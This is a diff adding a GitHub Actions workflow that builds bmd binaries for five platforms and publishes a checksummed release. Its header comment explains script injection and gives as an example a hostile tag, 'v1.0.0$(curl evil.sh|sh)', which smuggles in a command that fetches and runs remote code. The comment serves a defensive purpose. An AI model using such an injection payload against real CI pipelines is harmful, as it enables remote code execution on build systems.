@@ -1,0 +1,185 @@
+# Builds bmd for all five supported platforms and publishes a GitHub Release whenever a
+# `v*` tag is pushed. Native AOT cannot cross-compile, so there is one build job per
+# OS/architecture below — do not "optimise" this onto a single runner.
+#
+# SECURITY: the tag name (github.ref_name) is attacker-controlled input from whoever can
+# push a tag. Writing `${{ github.ref_name }}` (or any other `${{ }}` expression fed by
+# such input) directly into the text of a multi-line `run:` script is the classic GitHub
+# Actions "script injection" bug: the expression is substituted into the script *before*
+# the shell ever sees it, so a tag like `v1.0.0$(curl evil.sh|sh)` becomes part of the
+# script itself, not a quoted argument. Every place below that needs the tag/version
+# instead passes it through `env:` and reads it back as `"$REF_NAME"`/`"$VERSION"` — env
+# var values are never re-parsed as script text, so shell metacharacters in a hostile tag
+# stay inert data. Keep doing this for any future step that touches ref/tag/PR-title-like
+# input; don't inline `${{ github.* }}` into a `run:` body.
+#
+# The version is deliberately NOT sanitised here. Bmd.csproj's GenerateBuildInfo target
+# whitelists `$(Version)` against `\A[A-Za-z0-9.+-]+\z` and fails the build otherwise —
+# that guard closed a code-injection hole where a crafted tag could inject C# into the
+# stamped binary. A malformed tag should fail the affected build job loudly; re-sanitising
+# it here would just hide that guard's signal.
+
+name: Release
+
+on:
+  push:
+    tags:
+      - 'v*'
+
+# Least privilege by default: only the release job (which creates the GitHub Release)
+# gets contents: write, and only for itself.
+permissions:
+  contents: read
+
+# A release must not be half-cancelled by a second tag push racing the first.
+concurrency:
+  group: release-${{ github.ref_name }}
+  cancel-in-progress: false
+
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  build:
+    name: Build (${{ matrix.rid }})
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - rid: win-x64
+            os: windows-latest
+            archive: bmd-win-x64.zip
+          - rid: linux-x64
+            os: ubuntu-latest
+            archive: bmd-linux-x64.tar.gz
+          - rid: linux-arm64
+            os: ubuntu-24.04-arm
+            archive: bmd-linux-arm64.tar.gz
+          - rid: osx-x64
+            os: macos-latest
+            archive: bmd-osx-x64.tar.gz
+          - rid: osx-arm64
+            os: macos-latest
+            archive: bmd-osx-arm64.tar.gz
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      # Native AOT on Linux compiles via clang and links against zlib. The ubuntu runner
+      # images usually already have both, but that's an implementation detail of the image
+      # that can change without notice — install explicitly rather than rely on it.
+      - name: Install Native AOT build dependencies (Linux)
+        if: runner.os == 'Linux'
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y clang zlib1g-dev
+
+      - name: Determine version from tag
+        id: version
+        env:
+          REF_NAME: ${{ github.ref_name }}
+        run: |
+          version="${REF_NAME#v}"
+          echo "version=$version" >> "$GITHUB_OUTPUT"
+
+      - name: Publish (Native AOT)
+        env:
+          RID: ${{ matrix.rid }}
+          VERSION: ${{ steps.version.outputs.version }}
+        run: dotnet publish src/Bmd -c Release -r "$RID" -p:Version="$VERSION"
+
+      # Archive only the executable, never the .pdb (~15 MB of debug symbols next to a
+      # ~5 MB binary). tar (not zip) is used for the Unix RIDs specifically because zip
+      # does not reliably preserve the executable bit — a naive zip would produce a
+      # download that users can't run.
+      - name: Package (Windows)
+        if: runner.os == 'Windows'
+        shell: pwsh
+        env:
+          ARCHIVE: ${{ matrix.archive }}
+          RID: ${{ matrix.rid }}
+        run: |
+          Compress-Archive -Path "src/Bmd/bin/Release/net10.0/$env:RID/publish/bmd.exe" -DestinationPath $env:ARCHIVE -Force
+
+      - name: Package (Unix)
+        if: runner.os != 'Windows'
+        env:
+          ARCHIVE: ${{ matrix.archive }}
+          RID: ${{ matrix.rid }}
+        run: |
+          publish_dir="src/Bmd/bin/Release/net10.0/$RID/publish"
+          chmod +x "$publish_dir/bmd"
+          tar czf "$ARCHIVE" -C "$publish_dir" bmd
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ matrix.archive }}
+          path: ${{ matrix.archive }}
+          if-no-files-found: error
+          retention-days: 7
+
+  release:
+    name: Create release
+    needs: build
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      # No checkout here: this job only assembles already-built artifacts and talks to the
+      # GitHub API, so it has nothing to gain from a copy of repo content plus everything
+      # to lose (a release job holds contents: write).
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: dist
+          merge-multiple: true
+
+      - name: Compute checksums
+        working-directory: dist
+        run: sha256sum * > checksums.txt
+
+      # A tag containing a hyphen (e.g. v1.2.3-rc.1) is a pre-release by semver convention.
+      - name: Determine pre-release flag
+        id: prerelease
+        env:
+          REF_NAME: ${{ github.ref_name }}
+        run: |
+          if [[ "$REF_NAME" == *-* ]]; then
+            echo "flag=--prerelease" >> "$GITHUB_OUTPUT"
+          else
+            echo "flag=" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Write release notes
+        run: |
+          cat > notes.md <<'EOF'
+          Prebuilt `bmd` binaries. Verify the archive you download against `checksums.txt`
+          before running it. Docs: https://davojc.github.io/bmdcli/
+
+          | Archive | Platform |
+          |---|---|
+          | `bmd-win-x64.zip` | Windows x64 |
+          | `bmd-linux-x64.tar.gz` | Linux x64 |
+          | `bmd-linux-arm64.tar.gz` | Linux ARM64 |
+          | `bmd-osx-x64.tar.gz` | macOS x64 (Intel) |
+          | `bmd-osx-arm64.tar.gz` | macOS ARM64 (Apple Silicon) |
+          | `checksums.txt` | SHA-256 checksums of the archives above |
+          EOF
+
+      - name: Create GitHub release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+          REF_NAME: ${{ github.ref_name }}
+          PRERELEASE_FLAG: ${{ steps.prerelease.outputs.flag }}
+        run: |
+          gh release create "$REF_NAME" dist/* \
+            --title "$REF_NAME" \
+            --notes-file notes.md \
+            $PRERELEASE_FLAG
